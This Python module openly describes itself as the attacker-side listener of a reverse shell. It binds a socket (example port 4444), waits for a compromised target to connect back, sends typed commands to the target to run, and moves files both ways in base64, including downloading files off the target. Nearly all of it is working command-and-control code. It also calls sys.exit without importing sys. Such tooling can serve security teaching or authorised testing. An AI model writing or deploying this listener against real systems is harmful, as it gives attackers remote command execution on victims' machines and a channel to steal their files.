"""Module containing the class that will manage the listener for attacker"""

# Standard Library imports
import socket
import json
import base64


class Listener:

    def __init__(self, local_ip: str, local_port: int, listener: socket.socket) -> None:
        """
        Initializer that takes in the target machines IP, the port to listen to connections from
        and an instantiated listener object from the socket package.

        :param local_ip: (required) Local IP of target machine (e.g., "192.168.229.130")
        :param local_port: (required) Port for listener to monitor for connections (e.g., 4444)
        :param listener: (required) Instantiated listener object from socket package
        """
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                            1)  # enable option to reuse sockets in case connection drops to reconnect
        listener.bind((local_ip, local_port))  # expects a tuple () | create listener on local host
        listener.listen(0)  # how many backlogged connections can this server listener handle

        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection " + str(address))

    # Serialize as JSON and send
    def serialize_as_json_and_send(self, data: str) -> None:
        """
        Method that takes in a command as a string and converts it to
        a JSON string that will be sent via the socket to the target machine
        to execute locally. The JSON is then encoded to utf-8 byte string for
        ability to upload/download images, files, etc...

        :param data: String command (e.g., 'dir', 'ls', 'cwd', etc...)
        :return: None
        """
        self.connection.send(json.dumps(data).encode())

    # Deserialize data and return
    def deserialize_and_return(self):
        jsonData = b""  # create an empty byte string
        while True:  # create infinite loop to collect all data from the TCP stream in the pipe
            try:  # check to see if all data has been collected and JSON deserialization can occur
                jsonData = jsonData + self.connection.recv(
                    1024)  # update the empty string with 1024 bytes of data plus whatever already is in the jsonData var
                return json.loads(jsonData)
            except ValueError:  # if error occurs continue to collect data from stream until fully collected
                continue

    # Execute commands on remote machine
    def executeRemotely(self, command):
        self.serialize_as_json_and_send(command)  # send command to target host
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        return self.deserialize_and_return()  # get result from target host

    # Create copy file from target host
    @staticmethod
    def writeFile(path, content):  # take the bytes from read file on target and write it to new file
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))  # decoded base64 before writing to disk
            return "[+] Downloaded Successfully"
    @staticmethod
    def readFile(path):
        with open(path, 'rb') as file:  # read the file bytes for the file to be pushed to target host
            return base64.b64encode(file.read())  # encode it in base64 to prevent unknown character errors

    # Start up the listener
    def startListener(self):
        while True:
            command = input(">> ")
            command = command.split(" ")  # split string into list by spaces

            try:  # keep socket connection alive and check to see if there was an error
                if command[0] == "upload":
                    getFileContent = self.readFile(command[1])  # get the base64 encoded data from method
                    command.append(str(getFileContent))  # append the base64 encoded data to the command list as 3rd element

                result = self.executeRemotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.writeFile(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)
